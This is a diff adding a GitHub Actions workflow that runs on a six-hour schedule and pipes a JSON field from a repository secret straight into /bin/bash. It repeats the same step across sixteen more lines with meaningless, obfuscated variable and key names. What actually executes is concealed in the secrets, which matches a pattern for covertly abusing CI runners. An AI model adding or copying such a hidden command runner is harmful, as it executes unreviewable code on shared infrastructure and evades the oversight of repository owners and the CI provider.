@@ -1,0 +1,34 @@
+name: tonggansu3167
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tonggansu3167
+        env:
+          u109: ${{ secrets.u109 }}
+        run: |
+          echo $u109 | jq -r .vup605 | /bin/bash
+          echo $gj981 | jq -r .xbtdk7 | /bin/bash
+          echo $tqwri05 | jq -r .v7 | /bin/bash
+          echo $v9 | jq -r .go37 | /bin/bash
+          echo $vmwu81862 | jq -r .py64 | /bin/bash
+          echo $jznzj6332 | jq -r .vwi7738 | /bin/bash
+          echo $ge94 | jq -r .e7675 | /bin/bash
+          echo $mc5 | jq -r .tzr8 | /bin/bash
+          echo $zdaa79142 | jq -r .u66 | /bin/bash
+          echo $zd2 | jq -r .xbvlj46 | /bin/bash
+          echo $eyc458 | jq -r .qiw75 | /bin/bash
+          echo $p22 | jq -r .bebi8 | /bin/bash
+          echo $owpbf6018 | jq -r .otw53509 | /bin/bash
+          echo $d89 | jq -r .qs8 | /bin/bash
+          echo $fqhzu7 | jq -r .frsd3468 | /bin/bash
+          echo $f88 | jq -r .jbbsu14991 | /bin/bash
+          echo $cr60 | jq -r .ptrzz61 | /bin/bash
+
